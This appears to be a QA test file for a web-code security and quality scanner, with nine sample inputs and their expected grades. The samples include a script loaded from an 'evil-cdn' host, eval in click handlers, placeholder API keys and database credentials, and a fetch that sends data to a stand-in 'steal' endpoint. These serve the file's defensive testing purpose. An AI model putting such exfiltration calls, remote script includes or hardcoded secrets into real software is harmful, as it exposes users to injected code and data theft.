import { runAudit } from './run-audit';

const TEST_CASES = [
    {
        name: "Test 1: Extremely Bad HTML",
        code: `
            <!DOCTYPE html>
            <!-- AI generated component - DO NOT EDIT -->
            <html>
            <head>
                <title>Bad</title>
            </head>
            <body>
                <div class="container"><div class="row"><div class="col"><div class="container"><div class="row"><div class="col">
                <div class="container"><div class="row"><div class="col"><div class="container"><div class="row"><div class="col">
                <div style="width: 1200px">
                    <p>TODO: Replace with actual content</p>
                    <img src="bad.jpg">
                    <script src="http://evil-cdn.com/malicious.js"></script>
                    <button onclick="eval('alert(1)')">Click</button>
                    <button onclick="eval('alert(1)')">Click</button>
                    <button onclick="eval('alert(1)')">Click</button>
                    <button onclick="eval('alert(1)')">Click</button>
                    <button onclick="eval('alert(1)')">Click</button>
                </div>
                </div></div></div></div></div></div></div></div></div></div></div></div>
            </body>
            </html>
        `,
        mode: "html",
        expected: "Grade F, AI Smells >= 3, Security < 30"
    },
    {
        name: "Test 2: Medium Quality HTML",
        code: `
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Medium</title>
            </head>
            <body>
                <div class="flex items-center justify-between p-4 m-2 bg-white">
                    <p>Lorem ipsum dolor sit amet.</p>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                    <div class="flex items-center justify-between p-4 m-2 bg-white"></div>
                </div>
            </body>
            </html>
        `,
        mode: "html",
        expected: "Grade C/B-, AI Smells >= 1-2, CodeQuality 50-75"
    },
    {
        name: "Test 3: Clean Modern HTML",
        code: `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Clean</title>
                <link rel="preconnect" href="https://fonts.googleapis.com">
            </head>
            <body>
                <header>
                    <nav>
                        <ul><li>Home</li></ul>
                    </nav>
                </header>
                <main>
                    <article>
                        <h1>Clean Title</h1>
                        <p>Perfectly semantic.</p>
                        <img src="img.jpg" alt="Description" loading="lazy" width="800" height="600">
                    </article>
                </main>
                <footer>&copy; 2026</footer>
            </body>
            </html>
        `,
        mode: "html",
        expected: "Grade A, AI Smells 0, No Nesting Warning"
    },
    {
        name: "Test 4: React Code with Bad Patterns",
        code: `
            import React from 'react';
            export default function BadReact() {
                const data = "<div>Unsafe</div>";
                console.log("Log 1");
                return (
                    <div onClick={() => alert('bad')}>
                        <div dangerouslySetInnerHTML={{ __html: data }} />
                    </div>
                );
            }
        `,
        mode: "react",
        expected: "Grade D, Performance <= 90"
    },
    {
        name: "Test 5: MONEY LOSS DISASTER (Exposed Secrets)",
        code: `
            const OpenAIKey = "sk-0123456789abcdef0123456789abcdef0123456789abcdef"; // sk- prefix
            const StripeKey = "sk_live_51MfYs9L0yR2eR0f7vR0f7vR0f7vR0f7v"; // sk_live prefix
            const mongoUri = "mongodb+srv://admin:password123@cluster0.abcde.mongodb.net/prod-db";
            const AUTH_SECRET = "super-secret-jwt-token-123456";
            
            // This is a dummy sample but scanner should find it
            /* TODO: Remove these before prod */
        `,
        mode: "javascript",
        expected: "Grade F, UNSHIPPABLE, moneyRiskScore >= 95, secrets.count >= 4"
    },
    {
        name: "Test 6: SELF-AUDIT (Scanner Code Strictness)",
        code: `
            // This code contains many regex patterns and eval-like words
            const PATTERNS = [
                { name: 'Fake Key', regex: /sk-[a-z0-9]{48}/g, severity: 'critical' }
            ];
            function calculateEntropy(str) { 
                // complexity here
                return Math.random() * 5; 
            }
            if (code.includes('eval')) console.log('Found eval');
            const fetcher = () => fetch('http://malicious-site.com/steal?data=' + PATTERNS[0].name);
        `,
        mode: "javascript",
        expected: "Grade D or C, Security < 80 (due to suspicious fetch and fake patterns)"
    },
    {
        name: "Test 7: NONSENSE VALIDATION (Single Char)",
        code: "a",
        mode: "javascript",
        expected: "status: INVALID, Grade: N/A, Score: 0"
    },
    {
        name: "Test 8: NONSENSE VALIDATION (Short String)",
        code: "const x = 10; console.log(x);",
        mode: "javascript",
        expected: "status: INVALID, Grade: N/A, Score: 0 (Too short)"
    },
    {
        name: "Test 9: NONSENSE VALIDATION (Incomplete Tag)",
        code: "<div>Some text but no structure really and long enough to pass length check but no real code patterns here at all just filler text to reach eighty characters.",
        mode: "javascript",
        expected: "status: INVALID, Grade: N/A, Score: 0 (No patterns)"
    }
];

export function runTestSuite() {
    console.log("=== STARTING QA TEST SUITE ===");
    console.log("Persona: Strict Senior Reviewer\n");

    TEST_CASES.forEach(test => {
        const result = runAudit(test.code, test.mode as any);
        const criticalIssues = result.categories.accessibility.issues
            .concat(result.categories.performance.issues)
            .concat(result.categories.mobile.issues)
            .concat(result.categories.security.issues)
            .concat(result.categories.codeQuality.issues)
            .concat(result.categories.secrets.issues)
            .filter(i => i.severity === 'critical');

        console.log(`Test Name: ${test.name}`);
        console.log(`Expected Grade: ${test.expected}`);
        console.log(`Actual Grade: ${result.grade.grade}`);
        console.log(`Overall Score: ${result.overallScore}`);
        console.log(`Category Scores:`);
        console.log(`Accessibility: ${result.categories.accessibility.score}/100`);
        console.log(`Performance: ${result.categories.performance.score}/100`);
        console.log(`Mobile UX: ${result.categories.mobile.score}/100`);
        console.log(`Security: ${result.categories.security.score}/100`);
        console.log(`Code Quality: ${result.categories.codeQuality.score}/100`);
        console.log(`Secrets/Money Risk: ${result.categories.secrets.score}/100 (Risk Score: ${result.secrets?.moneyRiskScore || 0})`);
        console.log(`Grade Caps Triggered: ${result.grade.capsTriggered.length > 0 ? result.grade.capsTriggered.join(', ') : 'none'}`);
        console.log(`Top 3 Fixes Generated: ${result.topFixes.map(f => f.title).join(', ')}`);
        console.log(`AI Smells Count: ${result.aiSmells.length}`);
        console.log(`Secrets Found: ${result.secrets?.count || 0}`);
        console.log(`Critical Issues Found: ${criticalIssues.length > 0 ? criticalIssues.map(i => i.title).join(', ') : 'none'}`);
        console.log("----------------------------------\n");
    });

    console.log("=== TEST SUITE COMPLETE ===");
}
